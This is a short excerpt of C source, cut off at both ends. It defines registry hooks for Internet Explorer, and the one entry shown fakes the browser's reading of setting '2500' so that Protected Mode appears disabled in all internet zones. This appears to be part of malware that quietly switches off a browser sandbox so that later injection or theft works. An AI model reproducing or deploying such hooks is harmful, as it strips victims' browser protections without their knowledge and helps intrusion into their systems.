...
static REG_HOOK_DEFINITION RegHooksIE[] = 
{
	...
	// disabling protected mode for all internet zones
	{
		L"2500",
		L"Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",
		cstrlenA("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones"),
		REG_KEY_TYPE_USER | REG_KEY_BEGIN_WITH,
		REG_DWORD,
		sizeof(DWORD),
		{3,NULL},
		REG_ACTION_RETURN_VALUE
